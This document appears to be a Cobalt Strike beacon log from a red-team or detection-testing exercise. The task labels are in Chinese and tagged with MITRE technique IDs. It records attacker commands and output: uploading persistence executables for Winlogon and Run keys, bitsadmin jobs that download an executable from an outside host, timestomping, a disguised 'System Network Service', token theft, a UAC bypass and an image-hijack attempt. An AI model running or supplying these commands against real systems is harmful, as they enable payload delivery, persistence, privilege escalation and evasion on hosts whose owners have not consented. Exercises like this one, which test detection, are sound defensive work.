02/07 11:10:54 [task] 设置Winlogon 加载项
02/07 11:10:54 [task] Tasked beacon to make directory c:\RedTeam\
02/07 11:10:54 [task] cd c:\RedTeam\
02/07 11:10:54 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
02/07 11:10:54 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
02/07 11:10:54 [task] Tasked Beacon to execute: C:\RedTeam\T1004.exe in a high integrity context
02/07 11:11:28 [checkin] host called home, sent: 83099 bytes
02/07 11:11:29 [output]
received output:
[+] Success! Used token from PID 1780

02/07 11:12:02 [task] 设置Winlogon 加载项
02/07 11:12:02 [task] Tasked beacon to make directory c:\RedTeam\
02/07 11:12:02 [task] cd c:\RedTeam\
02/07 11:12:02 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
02/07 11:12:02 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
02/07 11:12:02 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/07 11:12:29 [checkin] host called home, sent: 7790 bytes
02/07 11:14:45 [task] 设置Winlogon 加载项
02/07 11:14:45 [task] Tasked beacon to make directory c:\RedTeam\
02/07 11:14:45 [task] cd c:\RedTeam\
02/07 11:14:45 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
02/07 11:14:45 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
02/07 11:14:45 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/07 11:15:29 [checkin] host called home, sent: 7790 bytes
02/07 11:25:28 [task] Tasked beacon to run: bitsadmin /create addfile
02/07 11:25:28 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
02/07 11:25:28 [task] Tasked beacon to run: bitsadmin /RESUME addfile
02/07 11:25:28 [task] Tasked beacon to run: bitsadmin /complete addfile
02/07 11:25:29 [checkin] host called home, sent: 688 bytes
02/07 11:25:32 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Created job {1B9225C8-AA56-49C9-BDE1-B8BBF119744A}.


02/07 11:25:32 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Added http://172.17.2.57:8080/test_1197.exe -> c:\RedTeam\test.exe to job.


02/07 11:25:32 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job resumed.


02/07 11:25:32 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job completed.


02/07 11:29:38 [task] Tasked beacon to run: bitsadmin /create addfile
02/07 11:29:38 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
02/07 11:29:38 [task] Tasked beacon to run: bitsadmin /RESUME addfile
02/07 11:29:38 [task] Tasked beacon to run: bitsadmin /complete addfile
02/07 11:30:32 [checkin] host called home, sent: 688 bytes
02/07 11:30:34 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Created job {8797A2AC-08CC-43FC-9CA4-F968B21F9411}.


02/07 11:30:34 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Added http://172.17.2.57:8080/test_1197.exe -> c:\RedTeam\test.exe to job.


02/07 11:30:34 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job resumed.


02/07 11:30:34 [output]
received output:

BITSADMIN version 3.0 [ 7.5.7601 ]
BITS administration utility.
(C) Copyright 2000-2006 Microsoft Corp.

BITSAdmin is deprecated and is not guaranteed to be available in future versions of Windows.
Administrative tools for the BITS service are now provided by BITS PowerShell cmdlets.

Job completed.


02/07 12:23:17 [task] 设置Winlogon 加载项
02/07 12:23:17 [task] Tasked beacon to make directory c:\RedTeam\
02/07 12:23:17 [task] cd c:\RedTeam\
02/07 12:23:17 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/07 12:23:34 [checkin] host called home, sent: 89 bytes
02/07 13:50:36 [task] 设置Winlogon 加载项
02/07 13:50:36 [task] Tasked beacon to make directory c:\RedTeam\
02/07 13:50:36 [task] cd c:\RedTeam\
02/07 13:50:36 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/07 13:50:49 [checkin] host called home, sent: 89 bytes
02/07 13:57:33 [task] 通过reg命令设置注册表项
02/07 13:57:33 [task] Tasked beacon to make directory c:\RedTeam\
02/07 13:57:33 [task] cd c:\RedTeam\
02/07 13:57:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/07 13:57:33 [indicator] file: 032219629f0c38b21ffa68e1a046b044 7680 bytes t1060_001.exe
02/07 13:57:33 [task] Tasked beacon to run: C:RedTeam	1060_001.exe
02/07 13:57:49 [checkin] host called home, sent: 7796 bytes
02/07 13:57:49 [output]
received output:
'C:RedTeam' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/07 13:59:15 [task] 通过reg命令设置注册表项
02/07 13:59:15 [task] Tasked beacon to make directory c:\RedTeam\
02/07 13:59:15 [task] cd c:\RedTeam\
02/07 13:59:15 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/07 13:59:15 [indicator] file: 032219629f0c38b21ffa68e1a046b044 7680 bytes t1060_001.exe
02/07 13:59:15 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
02/07 13:59:49 [checkin] host called home, sent: 7798 bytes
02/07 14:04:28 [task] 通过reg命令设置注册表项
02/07 14:04:29 [task] Tasked beacon to make directory c:\RedTeam\
02/07 14:04:29 [task] cd c:\RedTeam\
02/07 14:04:29 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/07 14:04:29 [indicator] file: 032219629f0c38b21ffa68e1a046b044 7680 bytes t1060_001.exe
02/07 14:04:29 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
02/07 14:04:49 [checkin] host called home, sent: 7798 bytes
02/07 14:06:50 [task] 通过reg命令设置注册表项
02/07 14:06:50 [task] Tasked beacon to make directory c:\RedTeam\
02/07 14:06:50 [task] cd c:\RedTeam\
02/07 14:06:50 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/07 14:06:50 [indicator] file: 39c258e67b0132162b1976d0543e81b8 7680 bytes t1060_001.exe
02/07 14:06:50 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
02/07 14:07:49 [checkin] host called home, sent: 7798 bytes
02/07 14:25:10 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
02/07 14:25:10 [task] cd c:\windows\system32
02/07 14:25:10 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
02/07 14:25:10 [task] Tasked beacon to run: sc delete netsrv
02/07 14:25:10 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
02/07 14:25:10 [task] Tasked beacon to run: sc start netsrv
02/07 14:25:49 [checkin] host called home, sent: 292 bytes
02/07 14:25:50 [error] could not set file time: 6
02/07 14:25:50 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



02/07 14:25:50 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



02/07 14:25:50 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



02/07 15:32:51 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
02/07 15:32:51 [task] cd c:\windows\system32
02/07 15:32:51 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
02/07 15:32:51 [task] Tasked beacon to run: sc delete netsrv
02/07 15:32:51 [task] Tasked beacon to run: sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"
02/07 15:32:51 [task] Tasked beacon to run: sc start netsrv
02/07 15:33:51 [checkin] host called home, sent: 292 bytes
02/07 15:33:51 [error] could not set file time: 6
02/07 15:33:51 [output]
received output:
[SC] OpenService 失败 5:

拒绝访问。



02/07 15:33:51 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



02/07 15:33:51 [output]
received output:
[SC] StartService: OpenService 失败 5:

拒绝访问。



02/07 15:53:17 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
02/07 15:53:17 [task] cd c:\windows\system32
02/07 15:53:17 [task] Tasked beacon to make directory c:\RedTeam\
02/07 15:53:17 [task] cd c:\RedTeam\
02/07 15:53:17 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
02/07 15:53:17 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
02/07 15:53:17 [task] Tasked Beacon to execute: copy C:\RedTeam\netsrv.exe C:\Windows\System32\netsrv in a high integrity context
02/07 15:53:17 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
02/07 15:53:17 [task] Tasked beacon to run: sc delete netsrv
02/07 15:53:17 [task] Tasked beacon to run: sc create netsrv binPath= "C:\ReadTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
02/07 15:53:17 [task] Tasked beacon to run: sc start netsrv
02/07 15:53:29 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
02/07 15:53:30 [task] cd c:\windows\system32
02/07 15:53:30 [task] Tasked beacon to make directory c:\RedTeam\
02/07 15:53:30 [task] cd c:\RedTeam\
02/07 15:53:30 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
02/07 15:53:30 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
02/07 15:53:30 [task] Tasked Beacon to execute: copy C:\RedTeam\netsrv.exe C:\Windows\System32\netsrv in a high integrity context
02/07 15:53:30 [task] Tasked beacon to timestomp netsrv.exe to cmd.exe
02/07 15:53:30 [task] Tasked Beacon to execute: sc delete netsrv in a high integrity context
02/07 15:53:30 [task] Tasked Beacon to execute: sc create netsrv binPath= "C:\ReadTeam\netsrv.exe" start= auto DisplayName= "System Network Service" in a high integrity context
02/07 15:53:30 [task] Tasked Beacon to execute: sc start netsrv in a high integrity context
02/07 15:53:51 [checkin] host called home, sent: 395970 bytes
02/07 15:53:54 [output]
received output:
[-] Failed. Tried 0 process tokens and taskmgr.exe

02/07 15:53:54 [output]
received output:
[SC] OpenService 失败 5:

拒绝访问。



02/07 15:53:54 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



02/07 15:53:54 [output]
received output:
[SC] StartService: OpenService 失败 5:

拒绝访问。



02/07 15:53:54 [output]
received output:
[-] Failed. Tried 0 process tokens and taskmgr.exe

02/07 15:53:54 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

02/07 15:53:54 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

02/07 15:53:54 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

02/07 16:09:46 [task] 根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe
02/07 16:09:46 [task] Tasked beacon to make directory c:\RedTeam\
02/07 16:09:46 [task] cd c:\RedTeam\
02/07 16:09:46 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
02/07 16:09:47 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
02/07 16:09:47 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
02/07 16:09:55 [checkin] host called home, sent: 160369 bytes
02/07 16:13:18 [task] 镜像劫持
02/07 16:13:55 [checkin] host called home, sent: 220 bytes
02/07 16:13:55 [output]
received output:
错误: 拒绝访问。

c:\RedTeam>

